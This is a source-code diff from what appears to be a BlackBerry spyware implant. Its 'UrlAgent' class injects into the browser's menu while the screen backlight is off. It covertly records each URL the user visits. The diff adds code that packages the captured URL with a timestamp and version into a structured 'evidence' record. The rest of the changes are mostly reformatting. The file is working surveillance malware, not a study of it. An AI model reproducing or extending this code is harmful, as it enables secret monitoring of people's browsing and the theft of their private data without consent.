@@ -9,14 +9,21 @@
  * *************************************************/
 package blackberry.agent;
 
+import java.util.Date;
+import java.util.Vector;
+
 import net.rim.device.api.system.Backlight;
 import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
+import blackberry.utils.DateTime;
+import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -41,8 +48,8 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
      *            the agent status
      */
     public UrlAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_URL, agentEnabled  , Conf.AGENT_URL_ON_SD, "UrlAgent");
-        
+        super(Agent.AGENT_URL, agentEnabled, Conf.AGENT_URL_ON_SD, "UrlAgent");
+
         //#ifdef URL_FORCED
         enable(true);
         //#endif
@@ -59,7 +66,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     protected UrlAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
-        
+
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
     }
@@ -77,14 +84,14 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
         } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.error("actualStart: " +ex);
+            debug.error("actualStart: " + ex);
             //#endif
         }
 
-        if (!applicationInjector.isInfected()) {       
-            if(!Backlight.isEnabled()){
+        if (!applicationInjector.isInfected()) {
+            if (!Backlight.isEnabled()) {
                 menuInject();
-            }    
+            }
         }
     }
 
@@ -92,7 +99,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef DEBUG
         debug.trace("menuInject");
         //#endif
-        
+
         applicationInjector.infect();
 
     }
@@ -101,7 +108,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef DEBUG
         debug.trace("actualStop");
         //#endif
-        
+
         AppListener.getInstance().removeApplicationObserver(this);
         AppListener.getInstance().removeBacklightObserver(this);
     }
@@ -111,11 +118,12 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        if (applicationInjector.isInfected() && Backlight.isEnabled() && isAppForeground) {
+        if (applicationInjector.isInfected() && Backlight.isEnabled()
+                && isAppForeground) {
             //#ifdef DEBUG
             debug.info("actualRun, infected, enabled, foreground");
             //#endif
-            
+
             applicationInjector.callMenuInContext();
         }
     }
@@ -128,9 +136,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef DEBUG
         debug.trace("parse");
         //#endif
-        
 
-        
         return true;
     }
 
@@ -149,7 +155,6 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
             isAppForeground = false;
         }
-
     }
 
     public void onBacklightChange(boolean on) {
@@ -157,7 +162,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#ifdef DEBUG
             debug.info("onBacklightChange, injecting");
             //#endif
-            
+
             //TODO: qui bisogna verificare che non avvengano due injection alla volta
             menuInject();
         }
@@ -167,13 +172,26 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef DEBUG
         debug.trace("saveUrl: " + url);
         //#endif
+
+        final Date date = new Date();
+        DateTime  datetime = new DateTime(date);
+        
+        int version = 0x20100713;
+        String browserType = "Browser";
+        String windowTitle = "Browser";
+
+        final Vector items = new Vector();
+        
+        items.addElement(datetime.getStructTm());
+        items.addElement(Utils.intToByteArray(version));
+        items.addElement(WChar.getBytes(url, true));
+        //items.addElement(WChar.getBytes(browserType, true));
+        //items.addElement(WChar.getBytes(windowTitle, true));
+        items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+
         evidence.createEvidence(null);
-        boolean ret = evidence.writeEvidence(url,  true);
-        if (ret == false) {
-            //#ifdef DEBUG
-            debug.error("Error writing file");
-            //#endif
-        }
+        evidence.writeEvidences(items);
         evidence.close();
+
     }
 }
